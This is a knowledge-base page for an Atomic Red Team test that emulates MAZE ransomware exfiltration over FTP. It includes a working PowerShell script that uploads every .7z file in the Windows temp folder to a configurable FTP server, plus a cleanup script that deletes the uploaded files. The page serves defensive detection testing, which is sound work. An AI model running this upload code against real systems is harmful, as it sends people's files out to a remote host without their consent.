---
atomic_guid: "57799bc2-ad1e-4130-a793-fb0c385130ba"
title: "MAZE FTP Upload"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.003"
attack_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "57799bc2-ad1e-4130-a793-fb0c385130ba"
  - "MAZE FTP Upload"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.
Upon successful execution, all 7z files within the %windir%\temp directory will be uploaded to a remote FTP server. 
Reference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol#^t1048003-exfiltration-over-unencrypted-non-c2-protocol|T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol]]

## Input Arguments

### ftp_server

- description: FTP Server address
- type: string
- default: 127.0.0.1

### password

- description: Password for FTP server login
- type: string

### username

- description: Username for FTP server login
- type: string

## Executor

- name: powershell

### Command

```powershell
$Dir_to_copy = "$env:windir\temp"
$ftp = "ftp://#{ftp_server}/"
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
if (test-connection -count 1 -computername "#{ftp_server}" -quiet)
{foreach($file in (dir $Dir_to_copy "*.7z"))
{echo "Uploading $file..."
$uri = New-Object System.Uri($ftp+$file.name)
$web_client.UploadFile($uri, $file.FullName)}}
else
{echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
```

### Cleanup

```powershell
$ftp = "ftp://#{ftp_server}/"
try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
{$uri = New-Object System.Uri($ftp+$file.name)
 $ftp_del = [System.Net.FtpWebRequest]::create($uri)
 $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
 $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
 $ftp_del.GetResponse()}} catch{}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml)
